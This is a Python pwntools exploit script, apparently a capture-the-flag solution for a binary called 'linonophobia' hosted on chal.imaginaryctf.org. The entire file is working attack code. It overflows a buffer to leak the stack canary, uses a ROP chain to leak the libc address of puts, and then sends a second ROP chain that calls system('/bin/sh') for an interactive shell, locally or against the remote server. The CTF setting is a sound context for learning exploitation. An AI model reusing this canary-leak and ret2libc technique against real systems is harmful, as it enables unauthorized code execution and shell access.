from pwn import *
from sys import *

context.log_level = 'warning'

elf = ELF("./linonophobia")
p = process("./linonophobia")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

HOST = "chal.imaginaryctf.org"
PORT = 42006

cmd = """
b*0x0000000000400800
"""

if(argv[1] == 'gdb'):
	gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
	p = remote(HOST,PORT)

#b'0x703c75dbe007fc00\n' 43
#b'(nil)\n' 44
#b'0x7ffff7de00b3\n' 45

payload = "A"*0x109
p.sendafter('sErVeR!\n', payload)
p.recvuntil(b'A'*0x108)
#print(p.recv())
canary = u64(p.recvn(8))-0x41
print(hex(canary))


payload = b'A'*0x100
payload += p64(canary)*2
payload += p64(0xdeadbeef)
payload += p64(0x0000000000400873) #pop rdi
payload += p64(elf.got['puts'])
payload += p64(elf.sym['puts'])
payload += p64(0x0000000000400566) #ret
payload += p64(elf.entry)
p.send(payload)
p.recv()

#print(p.recvline())
leak = u64(p.recvn(6)+b'\x00'*2)
print(hex(leak))
libc.address = leak - libc.sym['puts']
print(hex(libc.address))
p.sendafter('sErVeR!\n', b'A')

payload = b'A'*0x100
payload += p64(canary)*2
payload += p64(0xdeadbeef)
payload += p64(0x0000000000400873) #pop rdi
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(0x0000000000400566)
payload += p64(libc.sym['system'])
p.send(payload)

p.interactive()
